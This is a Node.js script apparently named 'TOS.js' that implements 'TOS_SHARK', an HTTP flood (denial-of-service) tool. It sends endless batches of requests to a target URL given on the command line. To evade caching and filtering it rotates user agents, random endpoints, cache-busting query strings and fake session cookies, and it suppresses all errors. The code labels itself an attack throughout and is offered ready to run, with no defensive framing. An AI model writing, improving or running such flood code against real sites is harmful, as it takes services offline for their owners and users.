const http2 = require('http2');
const https = require('https');
const { URL } = require('url');

class TOS_SHARK {
    constructor(target) {
        const url = new URL(target);
        this.host = url.hostname;
        this.isHttps = url.protocol === 'https:';
        this.target = target;
        
        this.running = true;
        this.attackActive = false;
        this.totalReqs = 0;
        this.startTime = Date.now();
        this.lastLog = Date.now();
        this.reqCounter = 0;
        this.attackStart = 0;
        this.breakStart = 0;
        this.currentMethod = '';
        
        // Attack methods pool
        this.methods = ['H2-MULTIPLEX', 'ENDPOINT-HOPPING', 'COOKIE-SESSION'];
        
        // Data pools
        this.userAgents = this.generateUserAgents();
        this.endpoints = this.generateEndpoints();
        this.cookies = this.generateCookies();
        this.methodsPool = ['GET', 'HEAD', 'POST', 'OPTIONS'];
        
        // Multiple targets pattern (2x URL, 1x URL pattern)
        this.targetVariants = this.generateTargetVariants(url);
        this.targetPatternIndex = 0;
        
        // Print header once
        console.log(`TØS-SHARK | *.* | MT-3M22`);
        console.log('-----------------------------------------------------------------');
        
        // Start immediately without warmup
        this.attackLoop();
    }

    // ===== TARGET RANDOMIZATION =====
    generateTargetVariants(baseUrl) {
        const variants = [];
        // Create 3 different path variations
        for (let i = 0; i < 3; i++) {
            const variant = new URL(baseUrl);
            // Add random query params to vary cache
            variant.search = `?v=${Date.now()}_${i}`;
            variants.push(variant);
        }
        return variants;
    }

    getNextTarget() {
        // Pattern: 2x URL A, 1x URL B, 2x URL A, 1x URL C, repeat
        const pattern = [0, 0, 1, 0, 0, 2];
        const idx = pattern[this.targetPatternIndex % pattern.length];
        this.targetPatternIndex++;
        return this.targetVariants[idx];
    }

    // ===== DATA GENERATORS =====
    generateUserAgents() {
        return [
            'Mozilla/5.0 (Linux; Android 12; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.45 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 11; SM-G991B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.120 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 10; SM-G970F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 13; SM-S908B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.5359.128 Mobile Safari/537.36',
            'Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36',
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Mozilla/5.0 (iPhone; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/537.36'
        ];
    }

    generateEndpoints() {
        const base = ['/', '/api', '/v1', '/v2', '/static', '/assets', '/data', '/json'];
        const patterns = [];
        
        // Generate random patterns like /api/v1/users/12345
        for (let i = 0; i < 20; i++) {
            const depth = Math.floor(Math.random() * 4) + 1;
            let path = '';
            for (let d = 0; d < depth; d++) {
                const segments = ['users', 'products', 'items', 'data', 'files', 'images', 'docs', 'api'];
                const randSeg = segments[Math.floor(Math.random() * segments.length)];
                path += `/${randSeg}`;
                
                // 30% chance to add ID
                if (Math.random() < 0.3) {
                    path += `/${Math.floor(Math.random() * 10000) + 1000}`;
                }
            }
            patterns.push(path);
        }
        
        return [...base, ...patterns];
    }

    generateCookies() {
        const cookies = [];
        for (let i = 0; i < 20; i++) { // Reduced from 50
            cookies.push({
                session: `s${Math.random().toString(36).substr(2, 12)}`,
                token: `t${Math.random().toString(36).substr(2, 8)}`,
                userId: Math.floor(Math.random() * 10000)
            });
        }
        return cookies;
    }

    // ===== MAIN LOOP =====
    async attackLoop() {
        let requestBatch = 0;
        
        while (this.running) {
            // Send batch of requests
            for (let i = 0; i < 100; i++) {
                if (!this.running) break;
                await this.sendRandomizedRequest();
                this.totalReqs++;
                this.reqCounter++;
                requestBatch++;
                
                // Log every 10 seconds
                const now = Date.now();
                if (now - this.lastLog >= 10000) {
                    this.lastLog = now;
                    console.log(`2M22:${this.reqCounter} --> ${this.lastStatus || 0}`);
                }
            }
            
            // Small delay between batches to prevent GC pressure
            await this.sleep(1);
            
            // Clean up every 1000 requests
            if (requestBatch >= 1000) {
                this.cleanup();
                requestBatch = 0;
            }
        }
    }

    // ===== RANDOMIZED REQUEST =====
    async sendRandomizedRequest() {
        const targetUrl = this.getNextTarget();
        const method = this.methodsPool[Math.floor(Math.random() * this.methodsPool.length)];
        const endpoint = this.endpoints[Math.floor(Math.random() * this.endpoints.length)];
        const userAgent = this.userAgents[Math.floor(Math.random() * this.userAgents.length)];
        
        // Build path with random pattern
        const fullPath = endpoint + (Math.random() > 0.5 ? `?r=${Math.random().toString(36).substr(2, 8)}` : '');
        
        const options = {
            hostname: targetUrl.hostname,
            path: fullPath,
            method: method,
            headers: {
                'User-Agent': userAgent,
                'Connection': 'close',
                'Accept': '*/*',
                'Accept-Encoding': 'gzip, deflate',
                'Cache-Control': 'no-cache'
            },
            timeout: 8000,
            agent: false // Prevent connection pooling
        };
        
        // Add random headers based on method
        if (method === 'POST') {
            options.headers['Content-Type'] = 'application/x-www-form-urlencoded';
            options.headers['Content-Length'] = '15';
        }
        
        // Add random cookie sometimes
        if (Math.random() > 0.7) {
            const cookie = this.cookies[Math.floor(Math.random() * this.cookies.length)];
            options.headers['Cookie'] = `session=${cookie.session}; token=${cookie.token}`;
        }
        
        return new Promise((resolve) => {
            const protocol = targetUrl.protocol === 'https:' ? https : http2;
            const req = protocol.request(options, (res) => {
                this.lastStatus = res.statusCode;
                res.on('data', () => {}); // Drain data
                res.on('end', resolve);
                res.destroy();
            });
            
            req.on('error', () => {
                this.lastStatus = 'ERR';
                resolve();
            });
            
            req.on('timeout', () => {
                req.destroy();
                this.lastStatus = 'TIMEOUT';
                resolve();
            });
            
            if (method === 'POST') {
                req.write('data=random');
            }
            
            req.end();
        });
    }

    // ===== CLEANUP =====
    cleanup() {
        // Force garbage collection if available
        if (global.gc) {
            global.gc();
        }
        
        // Rotate small subset of data to prevent memory growth
        if (Math.random() > 0.8) {
            this.userAgents = this.generateUserAgents();
        }
        
        // Clear any large arrays
        this.endpoints.length = Math.min(this.endpoints.length, 30);
        this.cookies.length = Math.min(this.cookies.length, 20);
    }

    // ===== UTILS =====
    sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
}

// Run
if (require.main === module) {
    // Minimal error handling
    process.on('uncaughtException', () => {});
    process.on('unhandledRejection', () => {});
    
    if (process.argv.length < 3) {
        console.log('Usage: node TOS.js https://target.com');
        process.exit(1);
    }
    
    new TOS_SHARK(process.argv[2]);
    
    process.on('SIGINT', () => {
        process.exit(0);
    });
}
